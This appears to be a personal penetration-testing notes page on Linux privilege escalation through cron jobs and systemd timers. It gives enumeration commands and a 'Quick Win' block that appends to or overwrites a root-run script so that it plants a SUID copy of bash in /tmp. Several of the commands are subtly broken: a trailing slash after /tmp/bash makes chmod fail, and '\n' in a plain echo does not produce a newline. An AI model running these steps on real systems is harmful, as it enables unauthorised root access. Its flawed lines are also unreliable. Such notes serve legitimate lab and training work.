-- -
Scheduled tasks that depending on their permissions and their use of paths, can let you hijack them to get a shell on a timed interval.
```bash
# you are looking for cronjobs owned/run by root that run custom scripts or custom software, but usually custom scripts. 
cat /etc/crontab
crontab -l 
```
From here, [[Dark Arts/Privesc/Linux/Exploits/Cron Jobs|Exploit]]
#### systemd timers
This is technically not cron jobs, but the function in the same way, they are just programs ran on a timer using systemd rather than cron, so I include them here. 
```bash
systemctl list-timers --all
```
[[Dark Arts/Privesc/Linux/Exploits/Cron Jobs|Exploitation]] will be the same as you would a Cron Job. 
#### Quick Win
```bash
# standard enum
cat /etc/crontab
crontab -l

# then if you see a script, in our example /usr/local/bin/overwrite.sh, then check its permissions
ls -la /usr/local/bin/overwrite.sh

# then you can replace the file entirely, add to it via a text editor or just append to the end via comand line
# append:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash/' >> /usr/local/bin/overwrite.sh

#overwrite
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash/' > /usr/local/bin/overwrite.sh

# or overwrite may need something like:
echo '#!/bin/bash\ncp /bin/bash /tmp/bash; chmod +s /tmp/bash/' > /usr/local/bin/overwrite.sh
```